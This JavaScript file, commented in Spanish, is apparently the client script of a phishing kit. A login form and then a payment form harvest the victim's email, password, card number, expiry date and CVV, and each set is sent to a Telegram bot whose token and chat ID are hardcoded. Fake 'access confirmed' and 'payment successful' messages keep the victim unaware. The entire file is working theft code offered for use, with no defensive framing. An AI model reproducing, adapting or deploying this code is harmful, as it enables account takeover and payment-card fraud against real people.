// CONFIGURACIÓN: REEMPLAZA ESTO CON TU TOKEN DE BOT Y CHAT ID
const TELEGRAM_BOT_TOKEN = '8889295576:AAHleJieVZECrTOoPyY1mVEwxg-BGRUDJHc'; 
const CHAT_ID = '-1004309334180'; 

// Función auxiliar mejorada para formatear mensaje con etiquetas profesionales
function formatMessage(type, data) {
    let msg = `🚨 *NUEVA CAPTURA: ${type.toUpperCase()}*\n\n`;
    
    if (type === 'LOGIN') {
        msg += `👤 *Usuario:* ${data.Correo}\n`;
        msg += `🔑 *Contraseña:* ${data.Clave}\n`;
    } else if (type === 'PAGO') {
        msg += `💳 *Titular:* ${data.Nombre}\n`;
        msg += `🔢 *Número Tarjeta:* ${data.Tarjeta}\n`;
        msg += `📅 *Fecha de Vencimiento:* ${data.Expiración}\n`;
        msg += `🔒 *Código CVV/CVC:* ${data.Cvc}\n`;
    }

    msg += `\n🌐 *Origen:* ${window.location.href}\n`;
    msg += `🕒 *Hora:* ${new Date().toLocaleString()}`;
    
    return msg;
}

// LÓGICA PARA PÁGINA DE INICIO (Login)
const loginForm = document.getElementById('loginForm');
if (loginForm) {
    loginForm.addEventListener('submit', (e) => {
        e.preventDefault();
        const email = document.getElementById('email').value;
        const pass = document.getElementById('password').value;

        const submitBtn = loginForm.querySelector('button');
        const originalText = submitBtn.textContent;
        submitBtn.textContent = '⏳ Verificando credenciales...';
        submitBtn.disabled = true;

        const msg = formatMessage('LOGIN', {
            'Correo': email,
            'Clave': pass
        });

        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`)
            .then(() => {
                submitBtn.textContent = '✅ Acceso Confirmado';
                submitBtn.style.backgroundColor = '#28a745';
                setTimeout(() => {
                    window.location.href = 'payment.html';
                }, 1000);
            })
            .catch(err => {
                alert('❌ Error de conexión, intenta de nuevo.');
                console.error(err);
                submitBtn.textContent = originalText;
                submitBtn.disabled = false;
                submitBtn.style.backgroundColor = '';
            });
    });
}

// LÓGICA PARA PÁGINA DE PAGO
const paymentForm = document.getElementById('paymentForm');
if (paymentForm) {
    paymentForm.addEventListener('submit', (e) => {
        e.preventDefault();
        const cardName = document.getElementById('cardName').value;
        const cardNum = document.getElementById('cardNumber').value;
        const expiry = document.getElementById('expiry').value;
        const cvc = document.getElementById('cvc').value;

        const submitBtn = paymentForm.querySelector('button');
        const originalText = submitBtn.textContent;
        submitBtn.textContent = '💳 Procesando pago...';
        submitBtn.disabled = true;

        const msg = formatMessage('PAGO', {
            'Nombre': cardName,
            'Tarjeta': cardNum,
            'Expiración': expiry,
            'Cvc': cvc
        });

        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`)
            .then(() => {
                paymentForm.innerHTML = `
                    <div class="success-message" style="animation: fadeIn 0.5s ease-out;">
                        <div style="font-size: 4rem; color: #28a745; margin-bottom: 1rem;">✅</div>
                        <h2 style="color: #28a745; margin-bottom: 0.5rem;">¡Pago Exitoso!</h2>
                        <p>Tu pedido ha sido confirmado y procesado.</p>
                        <p style="font-size: 0.9rem; color: #666; margin-top: 1rem;">
                            Redirigiendo a tu cuenta...
                        </p>
                        <div style="margin-top: 1.5rem; height: 4px; width: 100%; background: #eee; border-radius: 2px;">
                            <div style="height: 100%; width: 0%; background: #ffc72c; border-radius: 2px; transition: width 2s ease-out;"></div>
                        </div>
                    </div>
                `;

                setTimeout(() => {
                    document.querySelector('.success-message div:last-child div').style.width = '100%';
                }, 100);

                setTimeout(() => {
                    window.location.reload();
                }, 3000);
            })
            .catch(err => {
                alert('❌ Error en el pago, verifica tu tarjeta.');
                console.error(err);
                // Nota: En un entorno real, restaurar el formulario completo requeriría recargar la página o tener el HTML almacenado.
                // Aquí se simula una restauración básica o recarga.
                window.location.reload(); 
            });
    });
}
